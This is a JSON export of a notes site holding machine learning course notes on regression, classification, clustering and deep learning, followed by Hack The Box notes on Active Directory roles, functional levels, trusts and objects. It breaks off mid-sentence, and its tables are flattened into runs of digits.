{"AI/Binary-Classification":{"title":"Binary Classification","links":["AI/Regression","AI/Machine-Learning","AI/Multiclass-Classification"],"tags":[],"content":"What is it?\nClassification, like Regression, is a supervised Machine Learning technique; and therefore follows the same iterative process of training, validating, and evaluating models. Instead of calculating numeric values like a Regression model, the algorithms used to train classification models calculate probability values for class assignment and the evaluation metrics used to assess model performance compare the predicted classes to the actual classes.\nBinary classification algorithms are used to train a model that predicts one of two possible labels for a single class. Essentially, predicting true or false. In most real scenarios, the data observations used to train and validate the model consist of multiple feature (x) values and a y value that is either 1 or 0.\nExample\nTo understand how binary classification works, let’s look at a simplified example that uses a single feature (x) to predict whether the label y is 1 or 0. In this example, we’ll use the blood glucose level of a patient to predict whether or not the patient has diabetes. Here’s the data with which we’ll train the model:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlood glucose (x)Diabetic? (y)670103111417201161650\nTraining a binary classification model\nTo train the model, we’ll use an algorithm to fit the training data to a function that calculates the probability of the class label being true (in other words, that the patient has diabetes). Probability is measured as a value between 0.0 and 1.0, such that the total probability for all possible classes is 1.0. So for example, if the probability of a patient having diabetes is 0.7, then there’s a corresponding probability of 0.3 that the patient isn’t diabetic.\nThere are many algorithms that can be used for binary classification, such as logistic Regression, which derives a sigmoid (S-shaped) function with values between 0.0 and 1.0, like this:\n\nNote:\nDespite its name, in Machine Learning logistic Regression is used for classification, not Regression. The important point is the logistic nature of the function it produces, which describes an S-shaped curve between a lower and upper value (0.0 and 1.0 when used for binary classification).\nThe function produced by the algorithm describes the probability of y being true (y=1) for a given value of x. Mathematically, you can express the function like this:\nf(x) = P(y=1 | x)\nFor three of the six observations in the training data, we know that y is definitely true, so the probability for those observations that y=1 is 1.0 and for the other three, we know that y is definitely false, so the probability that y=1 is 0.0. The S-shaped curve describes the probability distribution so that plotting a value of x on the line identifies the corresponding probability that y is 1.\nThe diagram also includes a horizontal line to indicate the threshold at which a model based on this function will predict true (1) or false (0). The threshold lies at the mid-point for y (P(y) = 0.5). For any values at this point or above, the model will predict true (1); while for any values below this point it will predict false (0). For example, for a patient with a blood glucose level of 90, the function would result in a probability value of 0.9. Since 0.9 is higher than the threshold of 0.5, the model would predict true (1) - in other words, the patient is predicted to have diabetes.\nEvaluating a binary classification model\nAs with Regression, when training a binary classification model you hold back a random subset of data with which to validate the trained model. Let’s assume we held back the following data to validate our diabetes classifier:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlood glucose (x)Diabetic? (y)66010711121710871891\nApplying the logistic function we derived previously to the x values results in the following plot.\n\nBased on whether the probability calculated by the function is above or below the threshold, the model generates a predicted label of 1 or 0 for each observation. We can then compare the predicted class labels (ŷ) to the actual class labels (y), as shown here:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlood glucose (x)Actual diabetes diagnosis (y)Predicted diabetes diagnosis (ŷ)66001071111211710087108911\nBinary classification evaluation metrics\nThe first step in calculating evaluation metrics for a binary classification model is usually to create a matrix of the number of correct and incorrect predictions for each possible class label:\n\nThis visualization is called a confusion matrix, and it shows the prediction totals where:\n\nŷ=0 and y=0: True negatives (TN)\nŷ=1 and y=0: False positives (FP)\nŷ=0 and y=1: False negatives (FN)\nŷ=1 and y=1: True positives (TP)\n\nThe arrangement of the confusion matrix is such that correct (true) predictions are shown in a diagonal line from top-left to bottom-right. Often, color-intensity is used to indicate the number of predictions in each cell, so a quick glance at a model that predicts well should reveal a deeply shaded diagonal trend.\nAccuracy\nThe simplest metric you can calculate from the confusion matrix is accuracy - the proportion of predictions that the model got right. Accuracy is calculated as:\n(TN+TP) ÷ (TN+FN+FP+TP)\nIn the case of our diabetes example, the calculation is:\n\n(2+3) ÷ (2+1+0+3)\n= 5 ÷ 6\n= 0.83\n\nSo for our validation data, the diabetes classification model produced correct predictions 83% of the time.\nAccuracy might initially seem like a good metric to evaluate a model, but consider this. Suppose 11% of the population has diabetes. You could create a model that always predicts 0, and it would achieve an accuracy of 89%, even though it makes no real attempt to differentiate between patients by evaluating their features. What we really need is a deeper understanding of how the model performs at predicting 1 for positive cases and 0 for negative cases.\nRecall\nRecall is a metric that measures the proportion of positive cases that the model identified correctly. In other words, compared to the number of patients who have diabetes, how many did the model predict to have diabetes?\nThe formula for recall is:\nTP ÷ (TP+FN)\nFor our diabetes example:\n\n3 ÷ (3+1)\n= 3 ÷ 4\n= 0.75\n\nSo our model correctly identified 75% of patients who have diabetes as having diabetes.\nPrecision\nPrecision is a similar metric to recall, but measures the proportion of predicted positive cases where the true label is actually positive. In other words, what proportion of the patients predicted by the model to have diabetes actually have diabetes?\nThe formula for precision is:\nTP ÷ (TP+FP)\nFor our diabetes example:\n\n3 ÷ (3+0)\n= 3 ÷ 3\n= 1.0\n\nSo 100% of the patients predicted by our model to have diabetes do in fact have diabetes.\nF1-score\nF1-score is an overall metric that combined recall and precision. The formula for F1-score is:\n(2 x Precision x Recall) ÷ (Precision + Recall)\nFor our diabetes example:\n\n(2 x 1.0 x 0.75) ÷ (1.0 + 0.75)\n= 1.5 ÷ 1.75\n= 0.86\n\nArea Under the Curve (AUC)\nAnother name for recall is the true positive rate (TPR), and there’s an equivalent metric called the false positive rate (FPR) that is calculated as FP÷(FP+TN). We already know that the TPR for our model when using a threshold of 0.5 is 0.75, and we can use the formula for FPR to calculate a value of 0÷2 = 0.\nOf course, if we were to change the threshold above which the model predicts true (1), it would affect the number of positive and negative predictions; and therefore change the TPR and FPR metrics. These metrics are often used to evaluate a model by plotting a received operator characteristic (ROC) curve that compares the TPR and FPR for every possible threshold value between 0.0 and 1.0:\n\nThe ROC curve for a perfect model would go straight up the TPR axis on the left and then across the FPR axis at the top. Since the plot area for the curve measures 1x1, the area under this perfect curve would be 1.0 (meaning that the model is correct 100% of the time). In contrast, a diagonal line from the bottom-left to the top-right represents the results that would be achieved by randomly guessing a binary label; producing an area under the curve of 0.5. In other words, given two possible class labels, you could reasonably expect to guess correctly 50% of the time.\nIn the case of our diabetes model, the curve above is produced, and the area under the curve (AUC) metric is 0.875. Since the AUC is higher than 0.5, we can conclude the model performs better at predicting whether or not a patient has diabetes than randomly guessing.\n\nNext Unit: Multiclass Classification"},"AI/Clustering":{"title":"Clustering","links":["AI/Machine-Learning","AI/Deep-learning"],"tags":[],"content":"Clustering is a form of unsupervised Machine Learning in which observations are grouped into clusters based on similarities in their data values, or features. This kind of Machine Learning is considered unsupervised because it doesn’t make use of previously known label values to train a model. In a clustering model, the label is the cluster to which the observation is assigned, based only on its features.\nExample\nFor example, suppose a botanist observes a sample of flowers and records the number of leaves and petals on each flower:\n\nThere are no known labels in the dataset, just two features. The goal is not to identify the different types (species) of flower; just to group similar flowers together based on the number of leaves and petals.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLeaves (x1)Petals (x2)050613131618232728\nTraining a clustering model\nThere are multiple algorithms you can use for clustering. One of the most commonly used algorithms is K-Means clustering, which consists of the following steps:\n\nThe feature (x) values are vectorized to define n-dimensional coordinates (where n is the number of features). In the flower example, we have two features: number of leaves (x1) and number of petals (x2). So, the feature vector has two coordinates that we can use to conceptually plot the data points in two-dimensional space ([x1,x2])\nYou decide how many clusters you want to use to group the flowers - call this value k. For example, to create three clusters, you would use a k value of 3. Then k points are plotted at random coordinates. These points become the center points for each cluster, so they’re called centroids.\nEach data point (in this case a flower) is assigned to its nearest centroid.\nEach centroid is moved to the center of the data points assigned to it based on the mean distance between the points.\nAfter the centroid is moved, the data points may now be closer to a different centroid, so the data points are reassigned to clusters based on the new closest centroid.\nThe centroid movement and cluster reallocation steps are repeated until the clusters become stable or a predetermined maximum number of iterations is reached.\n\nThe following animation shows this process:\n\nEvaluating a clustering model\nSince there’s no known label with which to compare the predicted cluster assignments, evaluation of a clustering model is based on how well the resulting clusters are separated from one another.\nThere are multiple metrics that you can use to evaluate cluster separation, including:\n\nAverage distance to cluster center: How close, on average, each point in the cluster is to the centroid of the cluster.\nAverage distance to other center: How close, on average, each point in the cluster is to the centroid of all other clusters.\nMaximum distance to cluster center: The furthest distance between a point in the cluster and its centroid.\nSilhouette: A value between -1 and 1 that summarizes the ratio of distance between points in the same cluster and points in different clusters (The closer to 1, the better the cluster separation).\n\n\nNext unit: Deep learning"},"AI/Deep-learning":{"title":"Deep learning","links":["AI/Machine-Learning","AI/Regression"],"tags":[],"content":"Deep learning is an advanced form of Machine Learning that tries to emulate the way the human brain learns. The key to deep learning is the creation of an artificial neural network that simulates electrochemical activity in biological neurons by using mathematical functions, as shown here.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBiological neural networkArtificial neural networkNeurons fire in response to electrochemical stimuli. When fired, the signal is passed to connected neurons.Each neuron is a function that operates on an input value (x) and a weight (w). The function is wrapped in an activation function that determines whether to pass the output on.\nArtificial neural networks are made up of multiple layers of neurons - essentially defining a deeply nested function. This architecture is the reason the technique is referred to as deep learning and the models produced by it are often referred to as deep neural networks (DNNs). You can use deep neural networks for many kinds of Machine Learning problem, including Regression and classification, as well as more specialized models for natural language processing and computer vision.\nJust like other Machine Learning techniques discussed in this module, deep learning involves fitting training data to a function that can predict a label (y) based on the value of one or more features (x). The function (f(x)) is the outer layer of a nested function in which each layer of the neural network encapsulates functions that operate on x and the weight (w) values associated with them. The algorithm used to train the model involves iteratively feeding the feature values (x) in the training data forward through the layers to calculate output values for ŷ, validating the model to evaluate how far off the calculated ŷ values are from the known y values (which quantifies the level of error, or loss, in the model), and then modifying the weights (w) to reduce the loss. The trained model includes the final weight values that result in the most accurate predictions.\nExample - Using deep learning for classification\nTo better understand how a deep neural network model works, let’s explore an example in which a neural network is used to define a classification model for penguin species.\n\nThe feature data (x) consists of some measurements of a penguin. Specifically, the measurements are:\n\nThe length of the penguin’s bill.\nThe depth of the penguin’s bill.\nThe length of the penguin’s flippers.\nThe penguin’s weight.\n\nIn this case, x is a vector of four values, or mathematically, x=[x1,x2,x3,x4].\nThe label we’re trying to predict (y) is the species of the penguin, and that there are three possible species it could be:\n\nAdelie\nGentoo\nChinstrap\n\nThis is an example of a classification problem, in which the Machine Learning model must predict the most probable class to which an observation belongs. A classification model accomplishes this by predicting a label that consists of the probability for each class. In other words, y is a vector of three probability values; one for each of the possible classes: [P(y=0|x), P(y=1|x), P(y=2|x)].\nThe process for inferencing a predicted penguin class using this network is:\n\nThe feature vector for a penguin observation is fed into the input layer of the neural network, which consists of a neuron for each x value. In this example, the following x vector is used as the input: [37.3, 16.8, 19.2, 30.0]\nThe functions for the first layer of neurons each calculate a weighted sum by combining the x value and w weight, and pass it to an activation function that determines if it meets the threshold to be passed on to the next layer.\nEach neuron in a layer is connected to all of the neurons in the next layer (an architecture sometimes called a fully connected network) so the results of each layer are fed forward through the network until they reach the output layer.\nThe output layer produces a vector of values; in this case, using a softmax or similar function to calculate the probability distribution for the three possible classes of penguin. In this example, the output vector is: [0.2, 0.7, 0.1]\nThe elements of the vector represent the probabilities for classes 0, 1, and 2. The second value is the highest, so the model predicts that the species of the penguin is 1 (Gentoo).\n\nHow does a neural network learn?\nThe weights in a neural network are central to how it calculates predicted values for labels. During the training process, the model learns the weights that will result in the most accurate predictions. Let’s explore the training process in a little more detail to understand how this learning takes place.\n\n\nThe training and validation datasets are defined, and the training features are fed into the input layer.\nThe neurons in each layer of the network apply their weights (which are initially assigned randomly) and feed the data through the network.\nThe output layer produces a vector containing the calculated values for ŷ. For example, an output for a penguin class prediction might be [0.3. 0.1. 0.6].\nA loss function is used to compare the predicted ŷ values to the known y values and aggregate the difference (which is known as the loss). For example, if the known class for the case that returned the output in the previous step is Chinstrap, then the y value should be [0.0, 0.0, 1.0]. The absolute difference between this and the ŷ vector is [0.3, 0.1, 0.4]. In reality, the loss function calculates the aggregate variance for multiple cases and summarizes it as a single loss value.\nSince the entire network is essentially one large nested function, an optimization function can use differential calculus to evaluate the influence of each weight in the network on the loss, and determine how they could be adjusted (up or down) to reduce the amount of overall loss. The specific optimization technique can vary, but usually involves a gradient descent approach in which each weight is increased or decreased to minimize the loss.\nThe changes to the weights are backpropagated to the layers in the network, replacing the previously used values.\nThe process is repeated over multiple iterations (known as epochs) until the loss is minimized and the model predicts acceptably accurately.\n\nNote\nWhile it’s easier to think of each case in the training data being passed through the network one at a time, in reality the data is batched into matrices and processed using linear algebraic calculations. For this reason, neural network training is best performed on computers with graphical processing units (GPUs) that are optimized for vector and matrix manipulation.\n"},"AI/Machine-Learning":{"title":"Machine Learning","links":[],"tags":[],"content":"Fundamentally, a machine learning model is a software application that encapsulates a function to calculate an output value based on one or more input values. The process of defining that function is known as training. After the function has been defined, you can use it to predict new values in a process called inferencing.\nTypes of Machine Learning\nA breakdown of common types of machine learning is shown in the following diagram.\n\nSupervised machine learning\nSupervised machine learning is a general term for machine learning algorithms in which the training data includes both feature values and known label values. Supervised machine learning is used to train models by determining a relationship between the features and labels in past observations, so that unknown labels can be predicted for features in future cases.\nRegression\nRegression is a form of supervised machine learning in which the label predicted by the model is a numeric value. For example:\n\nThe number of ice creams sold on a given day, based on the temperature, rainfall, and windspeed.\nThe selling price of a property based on its size in square feet, the number of bedrooms it contains, and socio-economic metrics for its location.\nThe fuel efficiency (in miles-per-gallon) of a car based on its engine size, weight, width, height, and length.\n\nClassification\nClassification is a form of supervised machine learning in which the label represents a categorization, or class. There are two common classification scenarios.\nBinary classification\nIn binary classification, the label determines whether the observed item is (or isn’t) an instance of a specific class. Or put another way, binary classification models predict one of two mutually exclusive outcomes. For example:\n\nWhether a patient is at risk for diabetes based on clinical metrics like weight, age, blood glucose level, and so on.\nWhether a bank customer will default on a loan based on income, credit history, age, and other factors.\nWhether a mailing list customer will respond positively to a marketing offer based on demographic attributes and past purchases.\n\nIn all of these examples, the model predicts a binary true/false or positive/negative prediction for a single possible class.\nMulticlass classification\nMulticlass classification extends binary classification to predict a label that represents one of multiple possible classes. For example,\n\nThe species of a penguin (Adelie, Gentoo, or Chinstrap) based on its physical measurements.\nThe genre of a movie (comedy, horror, romance, adventure, or science fiction) based on its cast, director, and budget.\n\nIn most scenarios that involve a known set of multiple classes, multiclass classification is used to predict mutually exclusive labels. For example, a penguin can’t be both a Gentoo and an Adelie. However, there are also some algorithms that you can use to train multilabel classification models, in which there may be more than one valid label for a single observation. For example, a movie could potentially be categorized as both science fiction and comedy.\nUnsupervised machine learning\nUnsupervised machine learning involves training models using data that consists only of feature values without any known labels. Unsupervised machine learning algorithms determine relationships between the features of the observations in the training data.\nClustering\nThe most common form of unsupervised machine learning is clustering. A clustering algorithm identifies similarities between observations based on their features, and groups them into discrete clusters. For example:\n\nGroup similar flowers based on their size, number of leaves, and number of petals.\nIdentify groups of similar customers based on demographic attributes and purchasing behavior.\n\nIn some ways, clustering is similar to multiclass classification; in that it categorizes observations into discrete groups. The difference is that when using classification, you already know the classes to which the observations in the training data belong; so the algorithm works by determining the relationship between the features and the known classification label. In clustering, there’s no previously known cluster label and the algorithm groups the data observations based purely on similarity of features.\nIn some cases, clustering is used to determine the set of classes that exist before training a classification model. For example, you might use clustering to segment your customers into groups, and then analyze those groups to identify and categorize different classes of customer (high value - low volume, frequent small purchaser, and so on). You could then use your categorizations to label the observations in your clustering results and use the labeled data to train a classification model that predicts to which customer category a new customer might belong."},"AI/Multiclass-Classification":{"title":"Multiclass Classification","links":["AI/Machine-Learning","AI/Regression","AI/Binary-Classification","AI/Clustering"],"tags":[],"content":"Multiclass classification is used to predict to which of multiple possible classes an observation belongs. As a supervised Machine Learning technique, it follows the same iterative train, validate, and evaluate process as Regression and Binary Classification in which a subset of the training data is held back to validate the trained model.\nExample\nMulticlass classification algorithms are used to calculate probability values for multiple class labels, enabling a model to predict the most probable class for a given observation.\nLet’s explore an example in which we have some observations of penguins, in which the flipper length (x) of each penguin is recorded. For each observation, the data includes the penguin species (y), which is encoded as follows:\n\n0: Adelie\n1: Gentoo\n2: Chinstrap\n\nNote:\nA real scenario would include multiple feature (x) values. We’ll use a single feature to keep things simple.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlipper length (x)Species (y)1670172022521971189123221580\nTraining a multiclass classification model\nTo train a multiclass classification model, we need to use an algorithm to fit the training data to a function that calculates a probability value for each possible class. There are two kinds of algorithm you can use to do this:\n\nOne-vs-Rest (OvR) algorithms\nMultinomial algorithms\n\nOne-vs-Rest (OvR) algorithms\nOne-vs-Rest algorithms train a Binary Classification function for each class, each calculating the probability that the observation is an example of the target class. Each function calculates the probability of the observation being a specific class compared to any other class. For our penguin species classification model, the algorithm would essentially create three Binary Classification functions:\n\nf0(x) = P(y=0 | x)\nf1(x) = P(y=1 | x)\nf2(x) = P(y=2 | x)\n\nEach algorithm produces a sigmoid function that calculates a probability value between 0.0 and 1.0. A model trained using this kind of algorithm predicts the class for the function that produces the highest probability output.\nMultinomial algorithms\nAs an alternative approach is to use a multinomial algorithm, which creates a single function that returns a multi-valued output. The output is a vector (an array of values) that contains the probability distribution for all possible classes - with a probability score for each class which when totaled add up to 1.0:\nf(x) =[P(y=0|x), P(y=1|x), P(y=2|x)]\nAn example of this kind of function is a softmax function, which could produce an output like the following example:\n[0.2, 0.3, 0.5]\nThe elements in the vector represent the probabilities for classes 0, 1, and 2 respectively; so in this case, the class with the highest probability is 2.\nRegardless of which type of algorithm is used, the model uses the resulting function to determine the most probable class for a given set of features (x) and predicts the corresponding class label (y).\nEvaluating a multiclass classification model\nYou can evaluate a multiclass classifier by calculating Binary Classification metrics for each individual class. Alternatively, you can calculate aggregate metrics that take all classes into account.\nLet’s assume that we’ve validated our multiclass classifier, and obtained the following results:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlipper length (x)Actual species (y)Predicted species (ŷ)16500171002052119511183112212221422\nThe confusion matrix for a multiclass classifier is similar to that of a binary classifier, except that it shows the number of predictions for each combination of predicted (ŷ) and actual class labels (y):\n\nFrom this confusion matrix, we can determine the metrics for each individual class as follows:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nClassTPTNFPFNAccuracyRecallPrecisionF1-Score025001.01.01.01.0124100.861.00.670.8224010.860.671.00.8\nTo calculate the overall accuracy, recall, and precision metrics, you use the total of the TP, TN, FP, and FN metrics:\n\nOverall accuracy = (13+6)÷(13+6+1+1) = 0.90\nOverall recall = 6÷(6+1) = 0.86\nOverall precision = 6÷(6+1) = 0.86\n\nThe overall F1-score is calculated using the overall recall and precision metrics:\n\nOverall F1-score = (2x0.86x0.86)÷(0.86+0.86) = 0.86\n\n\nNext unit: Clustering"},"AI/Regression":{"title":"Regression","links":["AI/Machine-Learning","AI/Binary-Classification"],"tags":[],"content":"Regression models are trained to predict numeric label values based on training data that includes both features and known labels.\nTraining a regression model\nProcess\n\nThe diagram shows four key elements of the training process for supervised Machine Learning models:\n\nSplit the training data (randomly) to create a dataset with which to train the model while holding back a subset of the data that you’ll use to validate the trained model.\nUse an algorithm to fit the training data to a model. In the case of a regression model, use a regression algorithm such as linear regression.\nUse the validation data you held back to test the model by predicting labels for the features.\nCompare the known actual labels in the validation dataset to the labels that the model predicted. Then aggregate the differences between the predicted and actual label values to calculate a metric that indicates how accurately the model predicted for the validation data.\n\nExample\nWe’ll start by splitting the data and using a subset of it to train a model. Here’s the training dataset:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTemperature (x)Ice cream sales (y)51165146920722375268130\nTo get an insight of how these x and y values might relate to one another, we can plot them as coordinates along two axes, like this:\n\nNow we’re ready to apply an algorithm to our training data and fit it to a function that applies an operation to x to calculate y. One such algorithm is linear regression, which works by deriving a function that produces a straight line through the intersections of the x and y values while minimizing the average distance between the line and the plotted points, like this:\n\nThe line is a visual representation of the function in which the slope of the line describes how to calculate the value of y for a given value of x. The line intercepts the x axis at 50, so when x is 50, y is 0. As you can see from the axis markers in the plot, the line slopes so that every increase of 5 along the x axis results in an increase of 5 up the y axis; so when x is 55, y is 5; when x is 60, y is 10, and so on. To calculate a value of y for a given value of x, the function simply subtracts 50; in other words, the function can be expressed like this:\nf(x) = x-50\nYou can use this function to predict the number of ice creams sold on a day with any given temperature. For example, suppose the weather forecast tells us that tomorrow it will be 77 degrees. We can apply our model to calculate 77-50 and predict that we’ll sell 27 ice creams tomorrow.\nBut just how accurate is our model?\nRegression evaluation metrics\nBased on the differences between the predicted and actual values, you can calculate some common metrics that are used to evaluate a regression model.\nMean Absolute Error (MAE)\nThe variance in this example indicates by how many ice creams each prediction was wrong. It doesn’t matter if the prediction was over or under the actual value (so for example, -3 and +3 both indicate a variance of 3). This metric is known as the absolute error for each prediction, and can be summarized for the whole validation set as the mean absolute error (MAE).\nIn the ice cream example, the mean (average) of the absolute errors (2, 3, 3, 1, 2, and 3) is 2.33.\nMean Squared Error (MSE)\nThe mean absolute error metric takes all discrepancies between predicted and actual labels into account equally. However, it may be more desirable to have a model that is consistently wrong by a small amount than one that makes fewer, but larger errors. One way to produce a metric that “amplifies” larger errors by squaring the individual errors and calculating the mean of the squared values. This metric is known as the mean squared error (MSE).\nIn our ice cream example, the mean of the squared absolute values (which are 4, 9, 9, 1, 4, and 9) is 6.\nRoot Mean Squared Error (RMSE)\nThe mean squared error helps take the magnitude of errors into account, but because it squares the error values, the resulting metric no longer represents the quantity measured by the label. In other words, we can say that the MSE of our model is 6, but that doesn’t measure its accuracy in terms of the number of ice creams that were mis predicted; 6 is just a numeric score that indicates the level of error in the validation predictions.\nIf we want to measure the error in terms of the number of ice creams, we need to calculate the square root of the MSE; which produces a metric called, unsurprisingly, Root Mean Squared Error. In this case √6, which is 2.45 (ice creams).\nCoefficient of determination (R2)\nAll of the metrics so far compare the discrepancy between the predicted and actual values in order to evaluate the model. However, in reality, there’s some natural random variance in the daily sales of ice cream that the model takes into account. In a linear regression model, the training algorithm fits a straight line that minimizes the mean variance between the function and the known label values. The coefficient of determination (more commonly referred to as R2 or R-Squared) is a metric that measures the proportion of variance in the validation results that can be explained by the model, as opposed to some anomalous aspect of the validation data (for example, a day with a highly unusual number of ice creams sales because of a local festival).\nThe calculation for R2 is more complex than for the previous metrics. It compares the sum of squared differences between predicted and actual labels with the sum of squared differences between the actual label values and the mean of actual label values, like this:\nR2 = 1- ∑(y-ŷ)2 ÷ ∑(y-ȳ)2\nThe result of metric is a value between 0 and 1 that describes the proportion of variance explained by the model. In simple terms, the closer to 1 this value is, the better the model is fitting the validation data. In the case of the ice cream regression model, the R2 calculated from the validation data is 0.95.\n\nNext Unit: Binary Classification"},"HTB/AD-Functionality":{"title":"AD Functionality","links":["HTB/SID","HTB/Active-Directory","HTB/Services"],"tags":[],"content":"FSMO Roles\nThere are five Flexible Single Master Operation (FSMO) roles. These roles can be defined as follows:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRolesDescriptionSchema MasterThis role manages the read/write copy of the AD schema, which defines all attributes that can apply to an object in AD.Domain Naming MasterManages domain names and ensures that two domains of the same name are not created in the same forest.Relative ID (RID) MasterThe RID Master assigns blocks of RIDs to other DCs within the domain that can be used for new objects. The RID Master helps ensure that multiple objects are not assigned the same SID. Domain object SIDs are the domain SID combined with the RID number assigned to the object to make the unique SID.PDC EmulatorThe host with this role would be the authoritative DC in the domain and respond to authentication requests, password changes, and manage Group Policy Objects (GPOs). The PDC Emulator also maintains time within the domain.Infrastructure MasterThis role translates GUIDs, SIDs, and DNs between domains. This role is used in organizations with multiple domains in a single forest. The Infrastructure Master helps them to communicate. If this role is not functioning properly, Access Control Lists (ACLs) will show SIDs instead of fully resolved names.\nDepending on the organization, these roles may be assigned to specific DCs or as defaults each time a new DC is added. Issues with FSMO roles will lead to authentication and authorization difficulties within a domain.\n\nDomain and Forest Functional Levels\nMicrosoft introduced functional levels to determine the various features and capabilities available in Active Directory Domain Services (AD DS) at the domain and forest level. They are also used to specify which Windows Server operating systems can run a Domain Controller in a domain or forest. This and this article describe both the domain and forest functional levels from Windows 2000 native to Windows Server 2012 R2. Below is a quick overview of the differences in domain functional levels from Windows 2000 native up to Windows Server 2016, aside from all default Active Directory Directory Services features from the level just below it (or just the default AD DS features in the case of Windows 2000 native.)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDomain Functional LevelFeatures AvailableSupported Domain Controller Operating SystemsWindows 2000 nativeUniversal groups for distribution and security groups, group nesting, group conversion (between security and distribution and security groups), SID history.Windows Server 2008 R2, Windows Server 2008, Windows Server 2003, Windows 2000Windows Server 2003Netdom.exe domain management tool, lastLogonTimestamp attribute introduced, well-known users and computers containers, constrained delegation, selective authentication.Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008, Windows Server 2003Windows Server 2008Distributed File System (DFS) replication support, Advanced Encryption Standard (AES 128 and AES 256) support for the Kerberos protocol, Fine-grained password policiesWindows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008Windows Server 2008 R2Authentication mechanism assurance, Managed Service AccountsWindows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2Windows Server 2012KDC support for claims, compound authentication, and Kerberos armoringWindows Server 2012 R2, Windows Server 2012Windows Server 2012 R2Extra protections for members of the Protected Users group, Authentication Policies, Authentication Policy SilosWindows Server 2012 R2Windows Server 2016Smart card required for interactive logon new Kerberos features and new credential protection featuresWindows Server 2019 and Windows Server 2016\nA new functional level was not added with the release of Windows Server 2019. However, Windows Server 2008 functional level is the minimum requirement for adding Server 2019 Domain Controllers to an environment. Also, the target domain has to use DFS-R for SYSVOL replication.\nForest functional levels have introduced a few key capabilities over the years:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nVersionCapabilitiesWindows Server 2003saw the introduction of the forest trust, domain renaming, read-only domain controllers (RODC), and more.Windows Server 2008All new domains added to the forest default to the Server 2008 domain functional level. No additional new features.Windows Server 2008 R2Active Directory Recycle Bin provides the ability to restore deleted objects when AD DS is running.Windows Server 2012All new domains added to the forest default to the Server 2012 domain functional level. No additional new features.Windows Server 2012 R2All new domains added to the forest default to the Server 2012 R2 domain functional level. No additional new features.Windows Server 2016Privileged access management (PAM) using Microsoft Identity Manager (MIM).\n\nTrusts\nA trust is used to establish forest-forest or domain-domain authentication, allowing users to access resources in (or administer) another domain outside of the domain their account resides in. A trust creates a link between the authentication systems of two domains.\nThere are several trust types.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrust TypeDescriptionParent-childDomains within the same forest. The child domain has a two-way transitive trust with the parent domain.Cross-linka trust between child domains to speed up authentication.ExternalA non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering.Tree-roota two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.Foresta transitive trust between two forest root domains.\nTrust Example\n\nTrusts can be transitive or non-transitive.\n\nA transitive trust means that trust is extended to objects that the child domain trusts.\nIn a non-transitive trust, only the child domain itself is trusted.\n\nTrusts can be set up to be one-way or two-way (bidirectional).\n\nIn bidirectional trusts, users from both trusting domains can access resources.\nIn a one-way trust, only users in a trusted domain can access resources in a trusting domain, not vice-versa. The direction of trust is opposite to the direction of access.\n\nOften, domain trusts are set up improperly and provide unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications. Mergers and acquisitions can result in bidirectional trusts with acquired companies, unknowingly introducing risk into the acquiring company’s environment. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain."},"HTB/AD-Objects":{"title":"AD Objects","links":[],"tags":[],"content":"Reference: HTB\nWe will often see the term “objects” when referring to AD. What is an object? An object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers.\n\nUsers\nThese are the users within the organization’s AD environment. Users are considered leaf objects, which means that they cannot contain any other objects within them. Another example of a leaf object is a mailbox in Microsoft Exchange. A user object is considered a security principal and has a security identifier (SID) and a global unique identifier (GUID). User objects have many possible attributes, such as their display name, last login time, date of last password change, email address, account description, manager, address, and more. Depending on how a particular Active Directory environment is set up, there can be over 800 possible user attributes when accounting for ALL possible attributes as detailed here. This example goes far beyond what is typically populated for a standard user in most environments but shows Active Directory’s sheer size and complexity. They are a crucial target for attackers since gaining access to even a low privileged user can grant access to many objects and resources and allow for detailed enumeration of the entire domain (or forest).\nContacts\nA contact object is usually used to represent an external user and contains informational attributes such as first name, last name, email address, telephone number, etc. They are leaf objects and are NOT security principals (securable objects), so they don’t have a SID, only a GUID. An example would be a contact card for a third-party vendor or a customer.\nPrinters\nA printer object points to a printer accessible within the AD network. Like a contact, a printer is a leaf object and not a security principal, so it only has a GUID. Printers have attributes such as the printer’s name, driver information, port number, etc.\nComputers\nA computer object is any computer joined to the AD network (workstation or server). Computers are leaf objects because they do not contain other objects. However, they are considered security principals and have a SID and a GUID. Like 